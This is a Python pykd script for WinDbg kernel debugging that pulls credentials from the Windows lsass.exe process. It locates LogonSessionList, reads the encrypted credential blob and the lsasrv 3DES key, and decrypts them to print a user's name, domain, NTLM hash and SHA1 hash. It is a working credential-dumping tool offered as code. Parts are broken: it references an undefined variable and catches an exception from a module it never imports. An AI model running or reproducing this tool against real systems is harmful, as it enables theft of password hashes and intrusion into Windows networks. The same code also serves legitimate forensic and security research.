import pykd
from pykd import *
import sys
import time
from pyDes import *
from binascii import unhexlify,hexlify

# .load C:\Users\uf0\Desktop\pykd\pykd.dll
# !py c:\users\uf0\desktop\lsass.py

nt = None
EPROCESS = None

def setupGlobalObject():
    global nt, EPROCESS, ETHREAD
    try:
        nt = module("nt")
        EPROCESS = nt.type("_EPROCESS")
    except DbgException:
        dprintln("check symbol paths")

def error_log():
    print("\n(!) User Data structure ERROR - try reloading the target debugee OS")
    sys.exit()

def main():
    if not isKernelDebugging():
        dprintln("This script is only for kernel debugging")
        return

    setupGlobalObject()

    #parse nt process list and find lsass eprocess
    processLst = nt.typedVarList(nt.PsActiveProcessHead, "_EPROCESS", "ActiveProcessLinks.Flink")  
    for process in processLst:
        processName = loadCStr(process.ImageFileName)
        if processName == "lsass.exe":
            eproc = ("%x"% process )
            
    time_interval = 0.2
    pykd.dbgCommand(".process /i /p /r %s" % eproc)
    time.sleep(time_interval)
    pykd.go()
    # reload userland modules
    pykd.dbgCommand(".reload /user")
    time.sleep(time_interval)
    #retrieve usename and logondomain
    users_blob = (pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)")).split('\n\n')
    try:
        first_user_data  = (users_blob[0]).split('\n') # use this index to access multiple users    
        first_username    = first_user_data[0].split('  ')[1]
        first_logondomain = first_user_data[1].split('  ')[1]
    except IndexError:
        error_log()
    try:
        first_user_data  = users_pretty[0] # use this index to access multiple users    
        first_user_data_neato = first_user_data.split('\n')
        first_username    = first_user_data_neato[0].split('  ')[1]
        first_logondomain = first_user_data_neato[1].split('  ')[1]
    except IndexError:
        error_log()
        
    # retrieve crypto blob from each user
    crypto_blob = (pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B0\" poi(lsasrv!LogonSessionList)")).split('\n\n')
    # saves the first user's blob
    first_user_crypto  = ''.join(crypto_blob[0].split('  ')[1::2])
    # dump encrypted bytes of the 1st user
    first_user_crypto_neato = first_user_crypto.split('  ')[1::2]
    first_crypto = ''.join(first_user_crypto_neato) 
    try:
        first_user_crypto =  unhexlify(first_user_crypto.replace(" ", "").replace("-",""))
    except binascii.Error:
        error_log()
    print("\n(*) first user's crypto")
    print(hexlify(first_user_crypto))
    # find 3DES key
    tripdes_key_blob = pykd.dbgCommand("db (poi(poi(lsasrv!h3DesKey)+0x10)+0x38)+4 L18")
    # print tripdes_key_blob
    tripdes_key =  tripdes_key_blob.split('  ')[1::2][:2]
    tripdes_key =  unhexlify("".join(tripdes_key).replace(" ", "").replace("-",""))
    print("\n(*) 3des key")
    print(hexlify(tripdes_key))
    # decrypting the blob - the iv can be anything sinc CBC is not using it
    k = triple_des(tripdes_key, CBC,bytes.fromhex('deadbeefdeadbeef'))
    a = k.decrypt(first_user_crypto)  
    a = str(hexlify(a))
    ntlm,sha1 = a[150:182],a[214:254]
    print("\n(*)USERNAME :" + first_username)
    print("(*)LOGONDOMAIN :" + first_logondomain)
    print("(*)NTLM :" + ntlm)
    print("(*)SHA1 :" + sha1)

if __name__ == "__main__":
    main()
